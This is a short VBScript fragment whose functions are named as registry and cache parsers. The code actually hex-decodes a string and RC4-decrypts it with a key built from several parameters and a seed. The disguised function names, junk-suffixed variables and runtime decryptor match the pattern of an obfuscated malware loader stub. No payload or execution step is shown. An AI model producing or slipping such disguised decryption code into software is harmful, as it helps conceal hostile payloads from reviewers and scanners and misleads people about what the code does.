Function ParseRegistryChunk7(H)
Dim lngOff32,pid45
pid45="":lngOff32=1
Do While lngOff32<=Len(H)
pid45=pid45 & Chr(CLng("&H" & Mid(H,lngOff32,2)))
lngOff32=lngOff32+2
Loop
ParseRegistryChunk7=pid45
End Function

Function ReadCacheLine34(K)
Dim nLen994,nMax85,strRaw37,intIdx542
ReDim intIdx542(255)
For nLen994=0 To 255:intIdx542(nLen994)=nLen994:Next
nMax85=0
For nLen994=0 To 255
nMax85=(nMax85+intIdx542(nLen994)+Asc(Mid(K,(nLen994 Mod Len(K))+1,1))) Mod 256
strRaw37=intIdx542(nLen994):intIdx542(nLen994)=intIdx542(nMax85):intIdx542(nMax85)=strRaw37
Next
ReadCacheLine34=intIdx542
End Function

Function ParseRegistryChunk6(Zms,Tms,Gsy,Seed)
Dim tmp79,lngLen97,ptr41,ptr46,pid177,cnt23,ix29,raw90,ptr39
ix29=CStr(Tms) & ":" & CStr(Gsy) & ":" & CStr(Seed)
raw90=ParseRegistryChunk7(Zms)
ptr39=ReadCacheLine34(ix29)
tmp79=0:lngLen97=0:cnt23=""
For ptr46=1 To Len(raw90)
tmp79=(tmp79+1) Mod 256
lngLen97=(lngLen97+ptr39(tmp79)) Mod 256
pid177=ptr39(tmp79):ptr39(tmp79)=ptr39(lngLen97):ptr39(lngLen97)=pid177
ptr41=ptr39((ptr39(tmp79)+ptr39(lngLen97)) Mod 256)
cnt23=cnt23 & Chr(Asc(Mid(raw90,ptr46,1)) Xor ptr41)
Next
ParseRegistryChunk6=cnt23
End Function
